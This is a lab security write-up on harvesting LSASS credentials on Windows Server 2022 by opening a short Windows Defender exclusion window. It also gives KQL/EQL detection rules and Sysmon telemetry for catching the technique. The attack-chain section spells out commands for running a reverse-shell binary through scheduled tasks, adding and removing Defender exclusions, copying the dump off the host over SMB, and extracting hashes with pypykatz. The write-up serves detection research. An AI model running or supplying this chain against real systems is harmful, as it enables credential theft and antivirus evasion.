# LSASS Credential Dump via Defender Exclusion Window

## Overview

This writeup documents a post-compromise credential harvesting chain that survives Defender's artifact-based LSASS dump detection by exploiting a legitimate Windows Defender API to create a timed exclusion window. The chain was validated against Windows Server 2022 across multiple Defender signature versions in April 2026.

This is a follow-on to the Vector 4/5 LSASS dump chain. The Defender signature `Trojan:Win32/LsassDump.A` was confirmed to detect the dump artifact on disk independently of filename or extension (content-based detection). This vector documents how the chain survives that detection, where the detection boundary lies, and how that boundary evolved across three consecutive signature builds.

---

## Environment

| Host | Role | IP | OS | Signatures |
|------|------|----|----|------------|
| WIN-1KS84GNPAUM | Victim (Server 2022) | .198 | Build 20348.587 | 1449230 (working chain) |
| WIN-ATTACK | Victim (Server 2022) | .84 | Build 20348.587 | 1449228 (pre-research), 1449240 (post-update) |
| Kali | Attacker | .218 | — | — |
| ELK | SIEM | .250 | — | — |

---

## Signature Boundary — Critical Finding

Controlled testing across two Server 2022 hosts at identical OS build (20348.587) identified three distinct behavioral states across three consecutive Defender signature builds.

| Signature | Machine | Behavior | Detection Events |
|-----------|---------|----------|-----------------|
| 1449228 | WIN-ATTACK | Artifact caught on disk | EID 1116/1117 — Trojan:Win32/LsassDump.A |
| 1449230 | WIN-1KS84GNPAUM | Exclusion window bypasses detection | EID 1116/1117 suppressed during window; LsassDump.A → LsassDump.B transition observed intra-day |
| 1449240 | WIN-ATTACK | 0kb output — chain fails | Zero detection events — no EID 1116/1117 |

**At signature 1449228:** `Trojan:Win32/LsassDump.A` catches the artifact on disk via Real-Time Protection. Standard artifact-based detection. Exclusion window technique not yet applied.

**At signature 1449230:** The exclusion window works. The dump lands in the excluded path, exfil completes, NT hash extracted. `Trojan:Win32/LsassDump.A` never fires during the window. Additionally, within the same day of testing at this signature version, the detection name changed from `Trojan:Win32/LsassDump.A` (ThreatID 2147816345) to `Trojan:Win32/LsassDump.B` (ThreatID 2147893513) — same artifact content, same Real-Time Protection source, different threat identifier. Microsoft was actively iterating on this detection during the same period this research was conducted and published.

**At signature 1449240:** The exclusion window is irrelevant. The dump produces 0kb output with zero EID 1116/1117 events. Disabling real-time protection restores the dump primitive — strongly indicating Defender is blocking the operation prior to file creation. Observed behavior is consistent with process-level intervention rather than artifact detection. This is not tied to the previously observed CU behavior.

A path exclusion is a filesystem control. It has no jurisdiction over memory access interception.

**This technique has a signature expiry date. Observed boundary: between signature builds 1449230 and 1449240 — a delta of 10 signature builds.**

### Intra-day Signature Evolution — LsassDump.A to LsassDump.B

Event log analysis of WIN-1KS84GNPAUM confirmed the following transition at sig 1449230:

| Time | Threat Name | Threat ID | Path |
|------|-------------|-----------|------|
| 4/21/2026 11:45 AM | Trojan:Win32/LsassDump.A | 2147816345 | C:\Windows\Temp\update.log |
| 4/21/2026 12:26 PM | Trojan:Win32/LsassDump.A | 2147816345 | C:\Windows\Temp\update.log |
| 4/21/2026 1:56 PM | Trojan:Win32/LsassDump.B | 2147893513 | C:\Windows\Temp\yabadabadoo1.log |
| 4/22/2026 3:40 AM | Trojan:Win32/LsassDump.B | 2147893513 | C:\Windows\Temp\dmp220426.log |

Same artifact content, same detection source (Real-Time Protection), same signature build — different threat name and ID. Whether `.B` represents a pattern refinement or reclassification is not determinable from event log data alone.

WIN-ATTACK event logs confirmed zero 1116/1117 events at sig 1449240 — consistent with the dump being blocked prior to file creation rather than detected post-write.

---

## Detection Boundary Analysis

### What Defender catches (sig 1449228 / 1449230)

`Trojan:Win32/LsassDump.A` / `.B` detects the LSASS minidump artifact on disk. Detection is:
- **Content-based**, not path or filename based
- **Independent** of extension (`.dmp`, `.log`, `.txt` — all caught)
- **Active at SMB access** — `NT_STATUS_VIRUS_INFECTED` blocks remote retrieval of quarantined artifacts

### What Defender catches (sig 1449240)

- Observed behavior suggests interception of the dump primitive at the process level — consistent with blocking prior to filesystem write
- Exclusion path has no effect — 0kb output, artifact never created
- No alert, no quarantine, no EID 1116/1117 — silent block

### What Defender does not catch (any version tested)

- The dump binary (custom P/Invoke implementation)
- The TLS reverse shell
- Any execution prior to the dump primitive call

---

## Attack Chain

### Prerequisites

- SYSTEM-level shell on victim (established via TLS reverse shell — see Vector 4/5)
- `getit2.exe` staged to `C:\Windows\Tasks\` via SMB
- Attacker has valid credentials for SMB access
- Target running Defender signatures at or below build 1449230

### Execution Sequence

**1. Establish SYSTEM shell**

Via goexec scheduled task execution delivering TLS reverse shell (getit2.exe) to ncat listener on attacker:

```
goexec_v0.3.0_linux_amd64 //[VICTIM] \
  -u administrator \
  -p '[PASSWORD]' \
  --task '\\systemshell' \
  --exec 'C:\Windows\Tasks\getit2.exe' \
  --args ''
```

**2. Add Defender exclusion (SYSTEM shell)**

```powershell
Add-MpPreference -ExclusionPath "C:\Windows\Temp"
```

EID 5007 fires immediately.

**3. Dump LSASS into excluded path**

Via goexec scheduled task:

```
goexec_v0.3.0_linux_amd64 //[VICTIM] \
  -u administrator \
  -p '[PASSWORD]' \
  --task '\\lsassdump' \
  --exec 'C:\Windows\Tasks\getit2.exe' \
  --args '--dump C:\Windows\Temp\[FILENAME].log'
```

**4. Exfiltrate artifact (while exclusion still active)**

```bash
smbclient //[VICTIM]/C$ \
  -U '[USER]%[PASSWORD]' \
  -c "get Windows\Temp\[FILENAME].log /tmp/[FILENAME].dmp"
```

**Critical:** Exfiltration must occur before the exclusion is removed. If the exclusion is removed first, Defender rescans and blocks SMB with `NT_STATUS_VIRUS_INFECTED`.

**5. Remove exclusion (cleanup)**

```powershell
Remove-MpPreference -ExclusionPath "C:\Windows\Temp"
```

EID 5007 fires. No dump artifact remains on disk on the victim.

**6. Extract credentials offline**

```bash
pypykatz lsa minidump [FILENAME].dmp
```

### Operational Window

Total time between exclusion add and remove: under 60 seconds in observed runs. Detection never fired during any successful run.

---

## Detection

### EID 5007 — Defender Configuration Change

**Rule 1: Exclusion Path Added**

```kql
event.code: "5007" 
and event.provider: "Microsoft-Windows-Windows Defender" 
and winlog.event_data.New Value: *Exclusions*
```

Severity: **High** | MITRE: T1562.001

---

**Rule 2: Exclusion Path Removed**

```kql
event.code: "5007" 
and event.provider: "Microsoft-Windows-Windows Defender" 
and winlog.event_data.Old Value: *Exclusions*
```

Severity: **High** | MITRE: T1562.001

---

**Rule 3: Transient Exclusion Window (EQL — Event Correlation rule type)**

```eql
sequence by winlog.computer_name with maxspan=5m
  [any where event.code == "5007" and winlog.event_data.`New Value` like "*Exclusions*"]
  [any where event.code == "5007" and winlog.event_data.`Old Value` like "*Exclusions*"]
```

Severity: **Critical (99)** | MITRE: T1562.001

No common administrative workflow performs this sequence within a short window on the same host.

---

### EID 10 — LSASS Process Access (Sysmon)

```kql
event.code: "10" 
and winlog.event_data.TargetImage: "C:\\Windows\\system32\\lsass.exe" 
and winlog.event_data.SourceImage: *Tasks*
```

Severity: **Critical (99)** | MITRE: T1003.001

**Key telemetry indicators:**
- `GrantedAccess: 0x1FFFFF` — PROCESS_ALL_ACCESS, consistent with MiniDumpWriteDump
- `GrantedAccess: 0x1F3FFF` — handle duplication access, observed in same dump sequence
- `UNKNOWN(...)` entries in CallTrace — reflectively loaded or position-independent code
- SourceImage in `C:\Windows\Tasks\` — no legitimate process accesses lsass with full access from this path

**Critical note:** EID 10 fires on the memory access itself regardless of whether the artifact survives. At sig 1449240, EID 10 still fires even though the dump fails — the access attempt is logged regardless of Defender's response.

---

## Detection Gap

The exclusion window technique defeats artifact-based detection at sig 1449230 completely. At sig 1449240 the technique fails at the primitive level — but blue teams should not rely on this as a control. Signature versions are not a static defense boundary. A lower-signature estate, an air-gapped environment, or a delayed-update scenario restores attacker capability immediately.

**Minimum viable detection stack:**
- Winlogbeat collecting `Microsoft-Windows-Windows Defender/Operational` (EID 5007)
- Sysmon deployed with ProcessAccess monitoring targeting lsass.exe
- Correlation rule for the exclusion add→remove sequence

---

## Verification Steps

**1. Confirm signature version**
```powershell
Get-MpComputerStatus | Select-Object AntivirusSignatureVersion, AntivirusSignatureLastUpdated
```

**2. Run dump primitive with RTP enabled — observe file size**
```powershell
(Get-Item "C:\Windows\Temp\[FILENAME].log").Length
```
Expected at sig 1449230: ~45MB. Expected at sig 1449240: 0 bytes.

**3. Run dump primitive with RTP disabled — observe file size**
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```
If artifact is non-zero with RTP off and zero with RTP on, behavior is consistent with Defender intervention prior to filesystem write.

**4. Correlate with EID 10**

Confirm Sysmon EID 10 fires in both RTP-on and RTP-off conditions. The memory access attempt is logged regardless of outcome.

---

## Notes

- The dump binary (getit2.exe) remained undetected across all test runs
- The TLS reverse shell remained undetected across all test runs
- Observed behavior suggests a shift in Defender's detection boundary between sig 1449230 and 1449240 — consistent with intervention at the process level prior to filesystem write
- The shift is silent — no EID 1116/1117, no quarantine, no notification
- EID 10 remains the most reliable detection regardless of artifact survival or signature version
- Do not rely on signature version as a defense boundary — it is not a static control
- Binary-level analysis of the behavioral delta between these builds is left to researchers with access to the relevant components

---

*Lab: lab2019.local | Author: Osher Jacobs | GitHub: osherjacobs/AD-Lab-Research*
